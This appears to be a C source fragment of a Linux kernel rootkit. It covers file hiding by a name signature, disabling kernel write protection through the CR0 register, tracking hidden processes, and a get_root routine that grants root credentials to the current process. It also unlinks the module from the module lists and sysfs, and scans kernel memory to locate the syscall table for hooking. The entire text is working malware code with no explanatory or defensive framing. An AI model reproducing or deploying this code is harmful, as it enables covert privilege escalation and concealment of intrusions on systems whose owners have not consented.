/*The start and end addresses to search for syscall_table*/
#define START_ADDR PAGE_OFFSET
#define END_ADDR ULONG_MAX

/*The files containing this substring will be hidden*/
#define FILE_SIGNATURE "r0r0_"

/*Macros to disable/enable the write protection of the kernel space*/
#define DISABLE_W_PROTECTION {\
	write_cr0(read_cr0() & (~0x10000));\
	}
#define ENABLE_W_PROTECTION {\
	write_cr0(read_cr0() | 0x10000);\
	}

/*Variables about hiding/unhiding the module*/
struct list_head* module_prev;
struct list_head* process_prev;
struct kobject* kobject_parent_prev;
static unsigned int module_hidden = 0x0;

/*The syscall_table*/
unsigned long *syscall_table;

/*The struct to deal with hiding/unhiding processes*/
struct hidden_proc_st {
	pid_t pid;
	struct list_head list;
};
LIST_HEAD(hidden_list);

/*The struct to deal with directory entries in linux*/
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};

void hide_marked_pid(pid_t pid) {
	struct hidden_proc_st *hp, *hpt, *tmp;
	list_for_each_entry_safe(hpt, tmp, &hidden_list, list) {
                if(hpt->pid == pid) {
                        return;
                }
        }
	hp = kmalloc(sizeof(struct hidden_proc_st), GFP_KERNEL);
	if(! hp )
		return;
	
	hp->pid = pid;
	list_add(&hp->list, &hidden_list);	
}
void show_marked_pid(pid_t pid) {
	struct hidden_proc_st *hp, *tmp;
        list_for_each_entry_safe(hp, tmp, &hidden_list, list) {
                if(hp->pid == pid) {
                        list_del(&hp->list);
			kfree(hp);
			break;
                }
        }
	
}
int get_root(void) {
        struct cred *root = NULL;
        #if LINUX_VERSION_CODE < KERNEL_VERSION(2,6,29)
                current->euid = current->egid = 0;
                current->suid = current->sgid = 0;
                current->fsuid = current->fsgid = 0;
        #else
                root = prepare_creds();
                if(!root) return 0xffffffff;

		/*Check for strict type checks*/
		#if LINUX_VERSION_CODE <= KERNEL_VERSION(3,5,0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,0)
			root->uid.val = root->gid.val = 0;
                        root->euid.val = root->egid.val = 0;
                        root->suid.val = root->sgid.val = 0;
                        root->fsuid.val = root->fsgid.val = 0;
		#else
			root->uid = root->gid = 0;
                        root->euid = root->egid = 0;
                        root->suid = root->sgid = 0;
                        root->fsuid = root->fsgid = 0;
		#endif
		commit_creds(root);
		
        #endif
	return 0x0;
}

void module_hide(void) {
	if(module_hidden)
		return;
	module_prev = THIS_MODULE->list.prev;
	kobject_parent_prev = THIS_MODULE->mkobj.kobj.parent;
	
	list_del(&THIS_MODULE->list);	
	kobject_del(&THIS_MODULE->mkobj.kobj);
	
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
	module_hidden = (unsigned int)0x1;
}
void module_unhide(void) {
	if(!module_hidden)
		return;
	list_add(&THIS_MODULE->list, module_prev);
	kobject_add(&THIS_MODULE->mkobj.kobj, kobject_parent_prev, THIS_MODULE->name);
	kobject_add(THIS_MODULE->holders_dir, &THIS_MODULE->mkobj.kobj, "holders");
	module_hidden = (unsigned int)0x0;
}
unsigned long *get_syscall_table(void) {
	unsigned long i;
	unsigned long* syscall_table_offset;
	for(i=START_ADDR;i<END_ADDR;i+=sizeof(void*)){
		syscall_table_offset=(unsigned long*)i;
		if(syscall_table_offset[__NR_close]==(unsigned long)sys_close){
			return syscall_table_offset;
		}
	}
	return NULL;
}
